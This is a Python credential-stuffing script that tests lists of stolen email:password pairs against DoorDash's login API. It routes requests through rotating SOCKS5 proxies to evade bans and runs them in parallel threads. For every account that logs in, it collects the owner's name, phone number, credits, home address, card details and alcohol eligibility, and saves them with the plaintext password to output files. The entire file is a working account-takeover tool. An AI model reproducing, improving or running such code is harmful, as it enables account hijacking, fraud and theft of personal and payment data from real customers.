import requests
import random
import json
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support

requests.packages.urllib3.disable_warnings()

accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]
workingJson = []

headers = {
    'Content-Type': 'application/json',
}

def generateSocks5ProxyUrl(ip, port, username=None, password=None):
    if(username and password):
        return {
            'http': f"socks5://{username}:{password}@{ip}:{port}",
            'https': f"socks5://{username}:{password}@{ip}:{port}"
        }
    else:
        return {
            'http': f"socks5://{ip}:{port}",
            'https': f"socks5://{ip}:{port}"
        }

def generateLoginPayload(email, password):
    return {
        "email": email,
        "password": password
    }

def createOutputString(email, password, first_name, last_name, phone_number, account_credits, printable_address, default_card_type, default_card_exp_month, default_card_exp_year, default_card_last4, show_alcohol_experience):
    response = f"{email}:{password} | "
    if first_name and last_name:
        response += f"Name: {first_name} {last_name} | "
    if phone_number:
        response += f"Phone Number: {phone_number} | "
    if account_credits:
        response += f"Account Credits: {account_credits} | "
    if printable_address:
        response += f"Default Address: {printable_address} |"
    if default_card_type and default_card_exp_month and default_card_exp_year and default_card_last4:
        response += f"Default Card: {default_card_type}*{default_card_last4} Expires {default_card_exp_month}/{default_card_exp_year} | "
    if show_alcohol_experience:
        response += F"Alcohol Allowed: {str(show_alcohol_experience)} | "
    response += "\n" 
    return response

def checkAccount(account):
    proxy = random.choice(proxies)
    ip, port, username, password = proxy.split(':')
    userEmail, userPassword = account.split(':')
    proxyUrl = generateSocks5ProxyUrl(ip, port, username, password)
    try:
        response = requests.post('https://api.doordash.com/v2/auth/web_login/', proxies=proxyUrl, headers=headers, data=json.dumps(generateLoginPayload(userEmail, userPassword)))
        if (response.status_code == 403 or response.status_code == 406 or 'Access Denied' in response.text):
            print(f"[Cloudflare Banned Proxy] {proxy}")
        elif ('Login banned due to violation of terms of service' in response.text):
            print(f"[Banned Proxy] {proxy}")
        elif ('id' in response.text):
            # Convert response to JSON
            userData = response.json()
            # Inject the user's password into the response object
            userData['password'] = userPassword
            # User's Personal Info
            first_name = userData['first_name'] or None
            last_name = userData['last_name'] or None
            phone_number = userData['phone_number'] or None
            # Account Credits
            account_credits = userData['account_credits'] or None
            # Default Address Info
            default_address = userData['default_address'] or None
            if default_address: 
                printable_address = default_address['printable_address'] or None
            else:
                printable_address = None
            # Default Card Info
            default_card = userData['default_card'] or None
            if default_card:
                default_card_type = default_card['type'] or None
                default_card_exp_month = default_card['exp_month'] or None
                default_card_exp_year = default_card['exp_year'] or None
                default_card_last4 = default_card['last4'] or None
            else: 
                default_card_type = None
                default_card_exp_month = None
                default_card_exp_year =  None
                default_card_last4 = None
            # Can recieve alcohol
            show_alcohol_experience = userData['show_alcohol_experience'] or None
            # Combine into one string
            outputString = createOutputString(userEmail, userPassword, first_name, last_name, phone_number, account_credits, printable_address, default_card_type, default_card_exp_month, default_card_exp_year, default_card_last4, show_alcohol_experience)
            print(f"[Good Account] {outputString}")
            try:
                with open('working.txt', 'a') as f:
                    f.write(outputString)
                    f.close()
            except:
                print('[Write Fail] Failed to write account information to working file')
            try:
                workingJson.append(response.json())
                with open('data.json', 'w') as outfile:
                    json.dump(workingJson, outfile)
                    outfile.close()
            except:
                print('[Write Fail] Failed to write account information to JSON')
    except Exception as e:
        print(f'[Checking Failed] {e}')

def main():
    numThreads = input("How many threads would you like to use? ")
    freeze_support()

    pool = Pool(int(numThreads))
    pool.map(checkAccount, accounts)

    pool.close()
    pool.join()

if __name__ == "__main__":
    main()
